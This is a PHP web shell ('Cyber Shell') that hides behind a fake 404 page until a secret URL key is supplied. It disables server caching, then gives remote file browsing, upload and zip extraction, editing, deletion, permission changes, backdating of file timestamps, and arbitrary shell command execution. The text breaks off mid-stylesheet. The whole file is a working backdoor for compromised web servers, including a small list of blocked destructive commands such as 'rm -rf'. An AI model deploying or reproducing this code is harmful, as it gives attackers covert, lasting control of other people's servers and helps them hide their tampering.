<?php
error_reporting(0);
session_start();
$lite_speed_bypass = true;
if($lite_speed_bypass) {
    header('X-Litespeed-Cache: off');
    header('X-Litespeed-Tag: bypass');
    ini_set('opcache.enable', 0);
    if(isset($_SERVER['HTTP_X_LSCACHE'])) {
        unset($_SERVER['HTTP_X_LSCACHE']);
    }
}
$valid_hash = "006f52e9102a8d3be2fe5614f42ba989";

$is_authenticated = false;
$input_param = key($_GET);
$hashed_param = md5($input_param);

if ($hashed_param === $valid_hash) {
    $is_authenticated = true;
}

if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: #000;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                position: relative;
                overflow: hidden;
            }
            
            body::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: url('https://i.pinimg.com/736x/65/5a/7e/655a7e5fec1b8d69623499dca5103589.jpg') no-repeat center center fixed;
                background-size: cover;
                filter: blur(3px) brightness(0.3);
                z-index: -1;
            }
            
            .container {
                text-align: center;
                padding: 20px;
                position: relative;
                z-index: 1;
            }
            
            .ghost-container {
                position: relative;
                display: inline-block;
                animation: float 3s ease-in-out infinite;
            }
            
            .ghost {
                max-width: 400px;
                width: 100%;
                height: auto;
                border-radius: 20px;
                box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
                border: 2px solid #00ff00;
                transition: all 0.5s;
            }
            
            .ghost:hover {
                transform: scale(1.05);
                box-shadow: 0 0 80px rgba(0, 255, 0, 0.5);
            }
            
            .glitch-text {
                font-size: 3rem;
                font-weight: bold;
                text-transform: uppercase;
                color: #00ff00;
                text-shadow: 
                    2px 2px 0 #ff00ff,
                    -2px -2px 0 #00ffff;
                animation: glitch 1s infinite;
                margin-top: 30px;
                font-family: 'Courier New', monospace;
                letter-spacing: 5px;
            }
            
            .subtext {
                color: #0f0;
                font-size: 1.2rem;
                margin-top: 20px;
                font-family: 'Courier New', monospace;
                opacity: 0.8;
                text-shadow: 0 0 10px #0f0;
                animation: blink 2s infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-20px); }
            }
            
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
                100% { transform: translate(0); }
            }
            
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            
            .matrix-rain {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 0;
            }
            
            @media (max-width: 768px) {
                .ghost { max-width: 300px; }
                .glitch-text { font-size: 2rem; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="ghost-container">
                <img src="https://i.pinimg.com/736x/c2/c1/29/c2c129cf68e2c13019e1f5bcdd295772.jpg" 
                     alt="Ghost" 
                     class="ghost"
                     onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgNDAwIDQwMCI+PHJlY3Qgd2lkdGg9IjQwMCIgaGVpZ2h0PSI0MDAiIGZpbGw9IiMwMDAiLz48dGV4dCB4PSI1MCIgeT0iMjAwIiBmaWxsPSIjMDBmZjAwIiBmb250LWZhbWlseT0iTW9ub3NwYWNlIiBmb250LXNpemU9IjQwIj40MDQgTm90IEZvdW5kPC90ZXh0Pjwvc3ZnPg=='">
            </div>
            <div class="glitch-text">404 Not Found</div>
            <div class="subtext">The requested URL was not found on this server.</div>
        </div>
        
        <div class="matrix-rain"></div>
        
        <script>
            const canvas = document.createElement('canvas');
            canvas.classList.add('matrix-rain');
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
            const matrixArray = matrix.split("");
            
            const fontSize = 10;
            const columns = canvas.width / fontSize;
            
            const drops = [];
            for(let x = 0; x < columns; x++) {
                drops[x] = 1;
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(draw, 35);
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

if (!isset($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd();
}
if (!isset($_SESSION['error_message'])) {
    $_SESSION['error_message'] = '';
}
if (!isset($_SESSION['notification'])) {
    $_SESSION['notification'] = '';
}

$public_root = $_SERVER['DOCUMENT_ROOT'];
$script_path = dirname(__FILE__);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    $_SESSION['notification'] = '';
    $_SESSION['error_message'] = '';
    
    $response = ['success' => false, 'error' => '', 'data' => null, 'notification' => ''];
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'navigate':
            $target_path = $_POST['path'] ?? '';
            if (!empty($target_path) && $target_path[0] !== DIRECTORY_SEPARATOR) {
                $target_path = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target_path;
            }
            $real_path = realpath($target_path);
            if ($real_path && is_dir($real_path) && is_readable($real_path)) {
                $_SESSION['current_path'] = $real_path;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal: Tidak bisa mengakses direktori ini';
            }
            break;
            
        case 'list':
            $current_path = $_SESSION['current_path'];
            $items = getDirectoryContents($current_path);
            $breadcrumb = getFullBreadcrumb($current_path);
            
            $response['success'] = true;
            $response['data'] = [
                'items' => $items,
                'breadcrumb' => $breadcrumb
            ];
            break;
            
        case 'delete':
            $target = $_POST['target'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File/folder tidak ditemukan: ' . $target;
                break;
            }
            
            if (is_file($fullpath)) {
                if (!is_writable($fullpath)) {
                    @chmod($fullpath, 0644);
                }
                
                if (unlink($fullpath)) {
                    $response['notification'] = '✅ File berhasil dihapus: ' . $target;
                    $response['success'] = true;
                } else {
                    $response['error'] = '❌ Gagal menghapus file: ' . $target;
                }
            } elseif (is_dir($fullpath)) {
                if (deleteDirectory($fullpath)) {
                    $response['notification'] = '✅ Folder berhasil dihapus: ' . $target;
                    $response['success'] = true;
                } else {
                    $response['error'] = '❌ Gagal menghapus folder: ' . $target;
                }
            }
            break;
            
        case 'rename':
            $old = $_POST['old'] ?? '';
            $new = $_POST['new'] ?? '';
            $fullpath_old = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $old;
            $fullpath_new = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $new;
            
            if (!file_exists($fullpath_old)) {
                $response['error'] = '❌ File/folder tidak ditemukan: ' . $old;
                break;
            }
            
            if (file_exists($fullpath_new)) {
                $response['error'] = '❌ Nama sudah ada: ' . $new;
                break;
            }
            
            if (is_file($fullpath_old) && !is_writable($fullpath_old)) {
                @chmod($fullpath_old, 0644);
            }
            
            if (rename($fullpath_old, $fullpath_new)) {
                $response['notification'] = '✅ Berhasil rename: ' . $old . ' → ' . $new;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal rename: ' . $old;
            }
            break;
            
        case 'newfolder':
            $name = $_POST['name'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
            
            if (empty($name)) {
                $response['error'] = '❌ Nama folder tidak boleh kosong';
                break;
            }
            
            if (preg_match('/[<>:"\/\\|?*]/', $name)) {
                $response['error'] = '❌ Nama folder mengandung karakter tidak valid';
                break;
            }
            
            if (file_exists($fullpath)) {
                $response['error'] = '❌ Folder sudah ada: ' . $name;
                break;
            }
            
            if (!is_writable($_SESSION['current_path'])) {
                $response['error'] = '❌ Tidak bisa membuat folder: Izin ditolak';
                break;
            }
            
            if (mkdir($fullpath, 0755)) {
                $response['notification'] = '✅ Folder berhasil dibuat: ' . $name;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal membuat folder: ' . $name;
            }
            break;
            
        case 'newfile':
            $name = $_POST['name'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $name;
            
            if (empty($name)) {
                $response['error'] = '❌ Nama file tidak boleh kosong';
                break;
            }
            
            if (preg_match('/[<>:"\/\\|?*]/', $name)) {
                $response['error'] = '❌ Nama file mengandung karakter tidak valid';
                break;
            }
            
            if (file_exists($fullpath)) {
                $response['error'] = '❌ File sudah ada: ' . $name;
                break;
            }
            
            if (!is_writable($_SESSION['current_path'])) {
                $response['error'] = '❌ Tidak bisa membuat file: Izin ditolak';
                break;
            }
            
            if (file_put_contents($fullpath, '') !== false) {
                $response['notification'] = '✅ File berhasil dibuat: ' . $name;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal membuat file: ' . $name;
            }
            break;
            
        case 'upload':
            if (!isset($_FILES['file'])) {
                $response['error'] = '❌ Tidak ada file yang diupload';
                break;
            }
            
            if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
                $upload_errors = [
                    UPLOAD_ERR_INI_SIZE => 'File terlalu besar (max ' . ini_get('upload_max_filesize') . ')',
                    UPLOAD_ERR_FORM_SIZE => 'File terlalu besar',
                    UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
                    UPLOAD_ERR_NO_FILE => 'Tidak ada file yang diupload',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                    UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
                ];
                $error_msg = $upload_errors[$_FILES['file']['error']] ?? 'Unknown upload error';
                $response['error'] = '❌ Gagal upload: ' . $error_msg;
                break;
            }
            
            $filename = basename($_FILES['file']['name']);
            $dest = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $filename;
            
            if (!is_writable($_SESSION['current_path'])) {
                $response['error'] = '❌ Gagal upload: Direktori tidak writable';
                break;
            }
            
            if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                $response['notification'] = '✅ Upload berhasil: ' . $filename;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal upload: ' . $filename;
            }
            break;
            
        case 'upload_extract':
            if (!isset($_FILES['file'])) {
                $response['error'] = '❌ Tidak ada file yang diupload';
                break;
            }
            
            $file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
            if ($file_ext != 'zip') {
                $response['error'] = '❌ File harus berformat ZIP (bukan .' . $file_ext . ')';
                break;
            }
            
            if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
                $upload_errors = [
                    UPLOAD_ERR_INI_SIZE => 'File terlalu besar (max ' . ini_get('upload_max_filesize') . ')',
                    UPLOAD_ERR_FORM_SIZE => 'File terlalu besar',
                    UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
                    UPLOAD_ERR_NO_FILE => 'Tidak ada file yang diupload',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
                    UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
                    UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
                ];
                $error_msg = $upload_errors[$_FILES['file']['error']] ?? 'Unknown upload error';
                $response['error'] = '❌ Gagal upload: ' . $error_msg;
                break;
            }
            
            $zip_file = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            
            if (!is_writable($_SESSION['current_path'])) {
                $response['error'] = '❌ Gagal extract: Direktori tidak writable';
                break;
            }
            
            if (!move_uploaded_file($_FILES['file']['tmp_name'], $zip_file)) {
                $response['error'] = '❌ Gagal upload file ZIP';
                break;
            }
            
            $zip = new ZipArchive;
            $zip_status = $zip->open($zip_file);
            
            if ($zip_status !== TRUE) {
                $zip_errors = [
                    ZipArchive::ER_EXISTS => 'File already exists',
                    ZipArchive::ER_INCONS => 'Zip archive inconsistent',
                    ZipArchive::ER_MEMORY => 'Memory allocation failure',
                    ZipArchive::ER_NOENT => 'No such file',
                    ZipArchive::ER_NOZIP => 'Not a zip archive',
                    ZipArchive::ER_OPEN => "Can't open file",
                    ZipArchive::ER_READ => 'Read error',
                    ZipArchive::ER_SEEK => 'Seek error'
                ];
                $error_msg = $zip_errors[$zip_status] ?? 'Unknown error (code: ' . $zip_status . ')';
                $response['error'] = '❌ Gagal membuka file ZIP: ' . $error_msg;
                
                if (file_exists($zip_file)) {
                    unlink($zip_file);
                }
                break;
            }
            
            $total_files = $zip->numFiles;
            
            if ($zip->extractTo($_SESSION['current_path'])) {
                $zip->close();
                $response['notification'] = "✅ Upload + Extract berhasil! ZIP: " . basename($zip_file) . " ($total_files file diekstrak)";
                $response['success'] = true;
            } else {
                $zip->close();
                $response['error'] = '❌ Gagal mengekstrak file ZIP';
                if (file_exists($zip_file)) {
                    unlink($zip_file);
                }
            }
            break;
            
        case 'chmod':
            $target = $_POST['target'] ?? '';
            $perms = $_POST['perms'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File/folder tidak ditemukan: ' . $target;
                break;
            }
            
            if (!preg_match('/^[0-7]{3,4}$/', $perms)) {
                $response['error'] = '❌ Format permission salah! Gunakan angka oktal (contoh: 755, 644, 0444)';
                break;
            }
            
            $octal_perms = intval($perms, 8);
            $is_owner = (function_exists('posix_getuid') && fileowner($fullpath) == posix_getuid());
            
            if ($is_owner) {
                if (chmod($fullpath, $octal_perms)) {
                    $response['notification'] = '✅ Permission berhasil diubah: ' . $target . ' → ' . $perms;
                    $response['success'] = true;
                } else {
                    $response['error'] = '❌ Gagal mengubah permission';
                }
            } else {
                if (is_writable($fullpath)) {
                    if (chmod($fullpath, $octal_perms)) {
                        $response['notification'] = '✅ Permission berhasil diubah: ' . $target . ' → ' . $perms;
                        $response['success'] = true;
                    } else {
                        $response['error'] = '❌ Gagal mengubah permission';
                    }
                } else {
                    $response['error'] = '❌ Tidak bisa mengubah permission: File dalam mode read-only dan Anda bukan owner';
                }
            }
            break;
            
        case 'touch':
            $target = $_POST['target'] ?? '';
            $date = $_POST['date'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File tidak ditemukan: ' . $target;
                break;
            }
            
            $timestamp = strtotime($date);
            if (!$timestamp) {
                $response['error'] = '❌ Format tanggal salah. Gunakan format: YYYY-MM-DD HH:MM:SS';
                break;
            }
            
            if (!is_writable($fullpath)) {
                $current_perms = fileperms($fullpath);
                @chmod($fullpath, 0644);
            }
            
            if (touch($fullpath, $timestamp)) {
                $response['notification'] = '✅ Tanggal berhasil diubah: ' . $target . ' → ' . date('Y-m-d H:i:s', $timestamp);
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal mengubah tanggal';
            }
            
            if (isset($current_perms)) {
                @chmod($fullpath, $current_perms);
            }
            break;
            
        case 'edit':
            $target = $_POST['target'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File tidak ditemukan: ' . $target;
                break;
            }
            
            if (!is_file($fullpath)) {
                $response['error'] = '❌ Bukan file: ' . $target;
                break;
            }
            
            if (!is_readable($fullpath)) {
                $response['error'] = '❌ File tidak bisa dibaca';
                break;
            }
            
            $content = file_get_contents($fullpath);
            if ($content !== false) {
                $response['success'] = true;
                $response['data'] = ['content' => $content, 'file' => $target];
            } else {
                $response['error'] = '❌ Gagal membaca file: ' . $target;
            }
            break;
            
        case 'save':
            $target = $_POST['target'] ?? '';
            $content = $_POST['content'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File tidak ditemukan: ' . $target;
                break;
            }
            
            if (!is_writable($fullpath)) {
                $current_perms = fileperms($fullpath);
                @chmod($fullpath, 0644);
            }
            
            if (file_put_contents($fullpath, $content) !== false) {
                $response['notification'] = '✅ File berhasil disimpan: ' . $target;
                $response['success'] = true;
            } else {
                $response['error'] = '❌ Gagal menyimpan file';
            }
            
            if (isset($current_perms)) {
                @chmod($fullpath, $current_perms);
            }
            break;
            
        case 'command':
            $cmd = $_POST['cmd'] ?? '';
            $current_dir = $_SESSION['current_path'];
            
            $dangerous = ['rm -rf', 'mkfs', 'dd if=', 'format', 'del /f /s /q', 'chmod -R 000', 'chmod 000'];
            foreach ($dangerous as $danger) {
                if (stripos($cmd, $danger) !== false) {
                    $output = "❌ Command dilarang untuk alasan keamanan";
                    $response['success'] = true;
                    $response['data'] = ['output' => $output];
                    break 2;
                }
            }
            
            $output = '';
            $disabled = explode(',', ini_get('disable_functions'));
            $escaped_dir = escapeshellarg($current_dir);
            
            if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    $full_cmd = 'cd /d ' . $escaped_dir . ' && ' . $cmd . ' 2>&1';
                } else {
                    $full_cmd = 'cd ' . $escaped_dir . ' && ' . $cmd . ' 2>&1';
                }
                $output = shell_exec($full_cmd);
            } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    $full_cmd = 'cd /d ' . $escaped_dir . ' && ' . $cmd . ' 2>&1';
                } else {
                    $full_cmd = 'cd ' . $escaped_dir . ' && ' . $cmd . ' 2>&1';
                }
                exec($full_cmd, $out, $return_code);
                $output = implode("\n", $out);
                if ($return_code !== 0) {
                    $output .= "\n❌ Return code: " . $return_code;
                }
            } elseif (function_exists('system') && !in_array('system', $disabled)) {
                ob_start();
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    system('cd /d ' . $escaped_dir . ' && ' . $cmd, $return_code);
                } else {
                    system('cd ' . $escaped_dir . ' && ' . $cmd, $return_code);
                }
                $output = ob_get_clean();
                if ($return_code !== 0) {
                    $output .= "\n❌ Return code: " . $return_code;
                }
            } else {
                $output = "❌ Shell execution is disabled on this server.";
            }
            
            $output = "📁 Current directory: " . $current_dir . "\n$ " . $cmd . "\n\n" . $output;
            
            $response['success'] = true;
            $response['data'] = ['output' => $output];
            break;
            
        case 'get_direct_link':
            $target = $_POST['target'] ?? '';
            $fullpath = $_SESSION['current_path'] . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($fullpath)) {
                $response['error'] = '❌ File tidak ditemukan: ' . $target;
                break;
            }
            
            $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
            $relative_path = str_replace($_SERVER['DOCUMENT_ROOT'], '', $fullpath);
            $direct_url = $base_url . str_replace('\\', '/', $relative_path);
            
            $response['success'] = true;
            $response['data'] = ['url' => $direct_url];
            break;
    }
    
    echo json_encode($response);
    exit;
}

function getDirectoryContents($path) {
    $items = [];
    if (!is_readable($path)) {
        return [];
    }
    $files = scandir($path);
    if ($files === false) {
        return [];
    }
    $dirs = [];
    $file_items = [];
    foreach ($files as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullpath = $path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($fullpath);
        $perms = getPerms($fullpath);
        $item_data = [
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $is_dir ? '-' : formatSize(filesize($fullpath)),
            'perms' => $perms,
            'owner' => getOwner($fullpath),
            'modified' => date('Y-m-d H:i', filemtime($fullpath)),
            'perm_class' => getPermClass($perms),
            'is_writable' => is_writable($fullpath),
            'is_readable' => is_readable($fullpath)
        ];
        if ($is_dir) {
            $dirs[] = $item_data;
        } else {
            $file_items[] = $item_data;
        }
    }
    usort($dirs, function($a, $b) { return strcmp($a['name'], $b['name']); });
    usort($file_items, function($a, $b) { return strcmp($a['name'], $b['name']); });
    return array_merge($dirs, $file_items);
}

function getFullBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $current = '';
    foreach ($parts as $part) {
        if (empty($part)) {
            if (empty($current)) {
                $current = DIRECTORY_SEPARATOR;
                $breadcrumb[] = ['name' => 'root', 'path' => DIRECTORY_SEPARATOR];
            }
            continue;
        }
        if ($current === DIRECTORY_SEPARATOR) {
            $current .= $part;
        } else {
            $current .= DIRECTORY_SEPARATOR . $part;
        }
        $breadcrumb[] = [
            'name' => $part,
            'path' => $current
        ];
    }
    return $breadcrumb;
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function getPerms($path) {
    $perms = fileperms($path);
    if ($perms === false) return '???';
    $octal = substr(sprintf('%o', $perms), -4);
    if (is_dir($path)) {
        return 'd' . substr($octal, 1);
    }
    return $octal;
}

function getOwner($path) {
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $uid = fileowner($path);
        $gid = filegroup($path);
        $user = posix_getpwuid($uid);
        $group = posix_getgrgid($gid);
        $current_uid = posix_getuid();
        $is_owner = ($uid == $current_uid);
        $owner_name = $user['name'] ?? $uid;
        $group_name = $group['name'] ?? $gid;
        return $owner_name . ':' . $group_name . ($is_owner ? ' (you)' : '');
    }
    $uid = fileowner($path);
    $gid = filegroup($path);
    return $uid . ':' . $gid;
}

function getPermClass($perms) {
    $perms = ltrim($perms, 'd');
    if ($perms == '0755' || $perms == '755') return 'perm-755';
    if ($perms == '0644' || $perms == '644') return 'perm-644';
    if ($perms == '0444' || $perms == '444') return 'perm-444';
    if ($perms == '0777' || $perms == '777') return 'perm-777';
    return 'perm-other';
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            if (!deleteDirectory($path)) {
                return false;
            }
        } else {
            if (!is_writable($path)) {
                @chmod($path, 0644);
            }
            if (!unlink($path)) {
                return false;
            }
        }
    }
    return rmdir($dir);
}

$server_user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] ?? 'unknown' : 'unknown';
$home_path = dirname(__FILE__);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>its me zy | Cyber Shell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            min-height: 100vh;
            font-family: 'Share Tech Mono', monospace;
            position: relative;
            color: #00ffaa;
            line-height: 1.6;
            padding: 0;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('https://i.pinimg.com/736x/65/5a/7e/655a7e5fec1b8d69623499dca5103589.jpg') no-repeat center center fixed;
            background-size: cover;
            filter: brightness(0.4);
            z-index: -2;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 50%, rgba(0, 255, 170, 0.1) 0%, transparent 60%);
            z-index: -1;
            pointer-events: none;
        }

        .glitch-container {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }

        .glitch {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            color: #00ffaa;
            text-shadow: 
                0.05em 0 0 rgba(255, 0, 0, 0.75),
                -0.025em -0.05em 0 rgba(0, 255, 255, 0.75),
                0.025em 0.05em 0 rgba(0, 255, 0, 0.75);
            animation: glitch 500ms infinite;
            letter-spacing: 5px;
        }

        .glitch span {
            display: inline-block;
            animation: glitch-text 2s infinite;
        }

        @keyframes glitch {
            0% {
                text-shadow: 
                    0.05em 0 0 rgba(255, 0, 0, 0.75),
                    -0.05em -0.025em 0 rgba(0, 255, 255, 0.75),
                    -0.025em 0.05em 0 rgba(0, 255, 0, 0.75);
            }
            14% {
                text-shadow: 
                    0.05em 0 0 rgba(255, 0, 0, 0.75),
                    -0.05em -0.025em 0 rgba(0, 255, 255, 0.75),
                    -0.025em 0.05em 0 rgba(0, 255, 0, 0.75);
            }
            15% {
                text-shadow: 
                    -0.05em -0.025em 0 rgba(255, 0, 0, 0.75),
                    0.025em 0.025em 0 rgba(0, 255, 255, 0.75),
                    -0.05em -0.05em 0 rgba(0, 255, 0, 0.75);
            }
            49% {
                text-shadow: 
                    -0.05em -0.025em 0 rgba(255, 0, 0, 0.75),
                    0.025em 0.025em 0 rgba(0, 255, 255, 0.75),
                    -0.05em -0.05em 0 rgba(0, 255, 0, 0.75);
            }
            50% {
                text-shadow: 
                    0.025em 0.05em 0 rgba(255, 0, 0, 0.75),
                    0.05em 0 0 rgba(0, 255, 255, 0.75),
                    0 -0.05em 0 rgba(0, 255, 0, 0.75);
            }
            99% {
                text-shadow: 
                    0.025em 0.05em 0 rgba(255, 0, 0, 0.75),
                    0.05em 0 0 rgba(0, 255, 255, 0.75),
                    0 -0.05em 0 rgba(0, 255, 0, 0.75);
            }
            100% {
                text-shadow: 
                    -0.025em 0 0 rgba(255, 0, 0, 0.75),
                    -0.025em -0.025em 0 rgba(0, 255, 255, 0.75),
                    -0.025em -0.05em 0 rgba(0, 255, 0, 0.75);
            }
        }

        .container {
            width: 100%;
            min-height: 100vh;
            background: transparent;
            border: none;
            box-shadow: none;
            overflow: visible;
            padding: 10px;
        }

        .header {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 25px;
            border-bottom: 2px solid #00ffaa;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            margin-bottom: 5px;
            border-radius: 8px 8px 0 0;
        }

        .logo h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            color: #00ffaa;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
        }

        .logo small {
            font-size: 12px;
            color: #88ffaa;
            display: block;
            margin-top: 3px;
            opacity: 0.9;
        }

        .status {
            background: rgba(0, 0, 0, 0.2);
            padding: 10px 20px;
            border-radius: 30px;
            border: 1px solid #00ffaa;
            font-size: 13px;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .path {
            background: rgba(0, 0, 0, 0.15);
            padding: 12px 25px;
            border-bottom: 1px solid rgba(0, 255, 170, 0.3);
            font-size: 14px;
            word-break: break-all;
            font-family: monospace;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            margin-bottom: 5px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 5px;
        }

        .crumb-item {
            color: #88ffaa;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            transition: all 0.3s;
            border: 1px solid transparent;
            display: inline-block;
            cursor: pointer;
        }

        .crumb-item:hover {
            background: rgba(0, 255, 170, 0.15);
            border-color: #00ffaa;
            color: #fff;
        }

        .notification-message {
            background: rgba(0, 255, 0, 0.15);
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px 25px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            animation: slideIn 0.3s ease;
        }

        .error-message {
            background: rgba(255, 50, 50, 0.2);
            border: 1px solid #ff5555;
            color: #ff5555;
            padding: 10px 25px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .action-bar {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 25px;
            border-bottom: 1px solid rgba(0, 255, 170, 0.3);
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            margin-bottom: 5px;
        }

        .action-group {
            display: flex;
            gap: 8px;
            background: rgba(0, 0, 0, 0.2);
            padding: 6px;
            border-radius: 30px;
            border: 1px solid rgba(0, 255, 170, 0.3);
            align-items: center;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
